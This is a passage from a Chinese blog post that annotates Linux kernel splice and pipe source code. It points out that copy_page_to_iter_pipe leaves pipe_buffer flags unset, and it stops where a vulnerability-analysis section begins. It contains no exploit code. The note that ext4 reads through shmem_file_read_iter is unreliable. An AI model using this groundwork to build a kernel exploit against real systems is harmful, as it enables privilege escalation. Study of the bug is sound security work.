class="hljs-comment">//尝试在管道上执行具有指定偏移量的操作，这在管道操作中是不被允许的</span><br><span class="hljs-keyword">if</span> (off_in || off_out)<br><span class="hljs-keyword">return</span> -ESPIPE;<br><br><span class="hljs-comment">/* Splicing to self would be fun, but... */</span><br>        <span class="hljs-comment">//检查输入管道和输出管道是否相同。如果它们相同，表示尝试将数据从管道拷贝到自身，这是没有意义的操作</span><br><span class="hljs-keyword">if</span> (ipipe == opipe)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>         <span class="hljs-comment">//检查输入文件和输出文件的标志，如果其中任何一个设置了O_NONBLOCK标志，则将SPLICE_F_NONBLOCK标志添加到flags中</span><br><span class="hljs-keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br><br><span class="hljs-keyword">return</span> splice_pipe_to_pipe(ipipe, opipe, len, flags);<br>&#125;<br><br>    <span class="hljs-comment">//如果只有输入文件描述符是管道，则执行从管道到文件的splice操作</span><br><span class="hljs-keyword">if</span> (ipipe) &#123;<br>        <span class="hljs-comment">//在从管道中读取数据时，不允许指定偏移量</span><br><span class="hljs-keyword">if</span> (off_in)<br><span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-keyword">if</span> (off_out) &#123;<br><span class="hljs-keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))<span class="hljs-comment">//先检查输出文件是否支持写入操作（即是否支持PWRITE模式）</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//从用户空间拷贝输出偏移量到内核空间的offset变量中</span><br><span class="hljs-keyword">return</span> -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>offset = out-&gt;f_pos;<span class="hljs-comment">//没有指定输出偏移量，则将输出偏移量设置为输出文件当前的位置</span><br>&#125;<br><br>        <span class="hljs-comment">//检查是否设置了O_APPEND标志，如果设置了，表示在输出文件末尾追加数据，这是不允许的</span><br><span class="hljs-keyword">if</span> (unlikely(out-&gt;f_flags &amp; O_APPEND))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>        <span class="hljs-comment">//验证写入操作的有效性，包括检查文件是否可写以及写入位置是否有效。</span><br>ret = rw_verify_area(WRITE, out, &amp;offset, len);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-comment">//然后检查输入文件是否设置了O_NONBLOCK标志，如果设置了，则将SPLICE_F_NONBLOCK标志添加到flags中，表示执行非阻塞的splice操作</span><br><span class="hljs-keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br>        <br><span class="hljs-comment">//调用file_start_write()函数通知文件系统开始写入操作</span><br>file_start_write(out);<br>ret = do_splice_from(ipipe, out, &amp;offset, len, flags);<span class="hljs-comment">//由do_splice_from()函数完成从管道到文件的数据传输</span><br>file_end_write(out);<span class="hljs-comment">//调用file_end_write()函数通知文件系统写入操作已经完成。</span><br><br>        <span class="hljs-comment">//如果没有指定输出偏移量，则更新输出文件的位置为写入数据后的位置。</span><br><span class="hljs-keyword">if</span> (!off_out)<br>out-&gt;f_pos = offset;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_out, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>ret = -EFAULT;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><span class="hljs-comment">//如果只有输出文件描述符是管道，则执行从文件到管道的splice操作</span><br><span class="hljs-keyword">if</span> (opipe) &#123;<br><span class="hljs-keyword">if</span> (off_out)<span class="hljs-comment">//向管道中写入数据时，不允许指定偏移量</span><br><span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-keyword">if</span> (off_in) &#123;<br><span class="hljs-keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))<span class="hljs-comment">//先检查输入文件是否支持读取操作（即是否支持PREAD模式）</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//从用户空间拷贝输入偏移量到内核空间的offset变量中</span><br><span class="hljs-keyword">return</span> -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>offset = in-&gt;f_pos;<span class="hljs-comment">//没有指定输入偏移量，则将输入偏移量设置为输入文件当前的位置</span><br>&#125;<br>        <br><span class="hljs-comment">//如果输出文件描述符设置了非阻塞标志（O_NONBLOCK），则设置相应的标志位</span><br><span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br>        <br><span class="hljs-comment">//获取管道的锁，以确保并发情况下管道的操作不会冲突</span><br>pipe_lock(opipe);<br>        <br>        <span class="hljs-comment">//等待管道有足够的空间来写入数据</span><br>ret = wait_for_space(opipe, flags);<br><span class="hljs-keyword">if</span> (!ret) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_space;<br><br><span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">             opipe-&gt;max_usage 表示管道的最大使用量，即管道的总容量。</span><br><span class="hljs-comment">pipe_occupancy(opipe-&gt;head, opipe-&gt;tail) 表示当前管道中已占用的空间。</span><br><span class="hljs-comment">通过计算可知，p_space 表示管道中的剩余可用空间，即总容量减去已占用的空间。</span><br><span class="hljs-comment">*/</span><br>p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>             <span class="hljs-comment">//将写入数据的长度限制为当前管道剩余空间和给定长度 len 中的较小者。</span><br>len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br><br>ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>&#125;<br>        <span class="hljs-comment">//解锁</span><br>pipe_unlock(opipe);<br>        <br>        <span class="hljs-comment">//如果写入成功（返回值大于0），则唤醒管道上的读取者</span><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>wakeup_pipe_readers(opipe);<br>        <span class="hljs-comment">//如果没有指定输入偏移量，则更新输入文件描述符的当前位置</span><br><span class="hljs-keyword">if</span> (!off_in)<br>in-&gt;f_pos = offset;<br>        <span class="hljs-comment">//如果指定了输入偏移量，则将最终的偏移量从内核空间拷贝回用户空间</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>ret = -EFAULT;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="管道-管道"><a href="#管道-管道" class="headerlink" title="管道-&gt;管道"></a>管道-&gt;管道</h3><p>并不是很重要，就放一边吧😋</p><h4 id="splice-pipe-to-pipe"><a href="#splice-pipe-to-pipe" class="headerlink" title="splice_pipe_to_pipe"></a>splice_pipe_to_pipe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Splice contents of ipipe to opipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">splice_pipe_to_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *ipipe,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> pipe_inode_info *opipe,</span><br><span class="hljs-params">       <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">ibuf</span>, *<span class="hljs-title">obuf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head, o_head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_tail, o_tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_mask, o_mask;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> input_wakeup = <span class="hljs-literal">false</span>;<br><br><br>retry:<br>ret = ipipe_prep(ipipe, flags);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br>ret = opipe_prep(opipe, flags);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Potential ABBA deadlock, work around it by ordering lock</span><br><span class="hljs-comment"> * grabbing by pipe info address. Otherwise two different processes</span><br><span class="hljs-comment"> * could deadlock (one doing tee from A -&gt; B, the other from B -&gt; A).</span><br><span class="hljs-comment"> */</span><br>pipe_double_lock(ipipe, opipe);<br><br>i_tail = ipipe-&gt;tail;<br>i_mask = ipipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>o_head = opipe-&gt;head;<br>o_mask = opipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-type">size_t</span> o_len;<br><br><span class="hljs-keyword">if</span> (!opipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>i_head = ipipe-&gt;head;<br>o_tail = opipe-&gt;tail;<br><br><span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) &amp;&amp; !ipipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Cannot make any progress, because either the input</span><br><span class="hljs-comment"> * pipe is empty or the output pipe is full.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) ||<br>    pipe_full(o_head, o_tail, opipe-&gt;max_usage)) &#123;<br><span class="hljs-comment">/* Already processed some buffers, break */</span><br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (flags &amp; SPLICE_F_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We raced with another reader/writer and haven&#x27;t</span><br><span class="hljs-comment"> * managed to process any buffers.  A zero return</span><br><span class="hljs-comment"> * value means EOF, so retry instead.</span><br><span class="hljs-comment"> */</span><br>pipe_unlock(ipipe);<br>pipe_unlock(opipe);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];<br>obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];<br><br><span class="hljs-keyword">if</span> (len &gt;= ibuf-&gt;len) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Simply move the whole buffer from ipipe to opipe</span><br><span class="hljs-comment"> */</span><br>*obuf = *ibuf;<br>ibuf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>i_tail++;<br>ipipe-&gt;tail = i_tail;<br>input_wakeup = <span class="hljs-literal">true</span>;<br>o_len = obuf-&gt;len;<br>o_head++;<br>opipe-&gt;head = o_head;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to this pipe buffer,</span><br><span class="hljs-comment"> * so we can copy the contents over.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>*obuf = *ibuf;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Don&#x27;t inherit the gift and merge flags, we need to</span><br><span class="hljs-comment"> * prevent multiple steals of this page.</span><br><span class="hljs-comment"> */</span><br>obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;<br>obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;<br><br>obuf-&gt;len = len;<br>ibuf-&gt;offset += len;<br>ibuf-&gt;len -= len;<br>o_len = len;<br>o_head++;<br>opipe-&gt;head = o_head;<br>&#125;<br>ret += o_len;<br>len -= o_len;<br>&#125; <span class="hljs-keyword">while</span> (len);<br><br>pipe_unlock(ipipe);<br>pipe_unlock(opipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we put data in the output pipe, wakeup any potential readers.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>wakeup_pipe_readers(opipe);<br><br><span class="hljs-keyword">if</span> (input_wakeup)<br>wakeup_pipe_writers(ipipe);<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="文件-管道"><a href="#文件-管道" class="headerlink" title="文件-&gt;管道"></a>文件-&gt;管道</h3><h4 id="do-splice-to"><a href="#do-splice-to" class="headerlink" title="do_splice_to"></a>do_splice_to</h4><p>在 <code>do_splice_to</code> 中最终会调用到内核文件结构体函数表的 <code>splice_read</code> 指针，对于不同的文件系统而言该函数指针不同，以 ext4 文件系统为例，查表 <code>ext4_file_operations</code>，对应调用的函数应为 <code>generic_file_splice_read</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_to</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-comment">//验证源文件是否具有读取 len 字节数据的权限</span><br>ret = rw_verify_area(READ, in, ppos, len);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>len = MAX_RW_COUNT;<br><br><span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br><span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br><span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="generic-file-splice-read"><a href="#generic-file-splice-read" class="headerlink" title="generic_file_splice_read"></a>generic_file_splice_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">generic_file_splice_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//初始化 to 迭代器，将管道的读操作设置到 to 迭代器中，同时设置缓冲区长度为 len</span><br>iov_iter_pipe(&amp;to, READ, pipe, len);<br>i_head = to.head;<br>    <span class="hljs-comment">//初始化 kiocb 异步I/O控制块，使用给定的文件指针 in</span><br>init_sync_kiocb(&amp;kiocb, in);<br>kiocb.ki_pos = *ppos;<br>    <br>    <span class="hljs-comment">//调用 call_read_iter 函数，从文件中读取数据到管道。这里实际上是调用了文件的 read_iter 操作，并将读取的数据写入到管道中。</span><br>ret = call_read_iter(in, &amp;kiocb, &amp;to);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>*ppos = kiocb.ki_pos;<br>file_accessed(in);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>to.head = i_head;<br>to.iov_offset = <span class="hljs-number">0</span>;<br>iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment"> * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret == -EFAULT)<br>ret = -EAGAIN;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>在ext4文件系统中，read_iter其实为<code>shmem_file_read_iter</code>，这B函数调用链有点小长，贴个调用链先</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">shmem_file_read_iter<br>shmem_getpage；根据文件索引获取页框<br>copy_page_to_iter；将页框数据复制到目标缓冲区中<br><span class="hljs-built_in">copy_page_to_iter_pipe</span>()；如果目标缓冲区是管道迭代器，将数据复制到管道缓冲区中<br></code></pre></td></tr></table></figure><h4 id="copy-page-to-iter-pipe"><a href="#copy-page-to-iter-pipe" class="headerlink" title="copy_page_to_iter_pipe"></a>copy_page_to_iter_pipe</h4><p>最终在 <code>copy_page_to_iter_pipe()</code> 中，将对应的 <code>pipe_buffer-&gt;page</code> 设为<strong>文件映射的页面集的对应页框</strong>，将页框引用计数 + 1（<code>get_page()</code>），这样就完成了一个<strong>从文件读取数据到管道的过程</strong>，因为是直接建立页面的映射，所以每次操作后都会将 <code>head +1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-type">size_t</span> off;<br><br><span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>bytes = i-&gt;count;<br><br><span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br><span class="hljs-comment">//off是NULL应该🤔</span><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-comment">/* merge with the last one */</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>PS：此处并没有对pipe_buffer-&gt;flags的设置操作</strong></p><h3 id="管道-文件"><a href="#管道-文件" class="headerlink" title="管道-&gt;文件"></a>管道-&gt;文件</h3><h4 id="do-splice-from"><a href="#do-splice-from" class="headerlink" title="do_splice_from"></a>do_splice_from</h4><p><code>do_splice_from</code> 最终会根据所操作的文件的属性调用相应的内核文件结构中的 <code>splice_write()</code> 函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (out-&gt;f_op-&gt;splice_write)<br><span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br><span class="hljs-keyword">return</span> default_file_splice_write(pipe, out, ppos, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="iter-file-splice-write"><a href="#iter-file-splice-write" class="headerlink" title="iter_file_splice_write"></a>iter_file_splice_write</h4><p>在<strong>ext4</strong>文件系统中，这个函数指针是<code>iter_file_splice_write</code>，最终会调用如下函数</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">iter_file_splice_write<br>splice_from_pipe_next <span class="hljs-comment">;检查管道可用性</span><br>vfs_iter_write <span class="hljs-comment">;将读取的数据写入目标文件</span><br>do_iter_write<br>do_iter_readv_writev<br> call_write_iter<br> generic_file_write_iter <span class="hljs-comment">;后面还有，但应该就是普通的拷贝数据之类的</span><br></code></pre></td></tr></table></figure><h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" 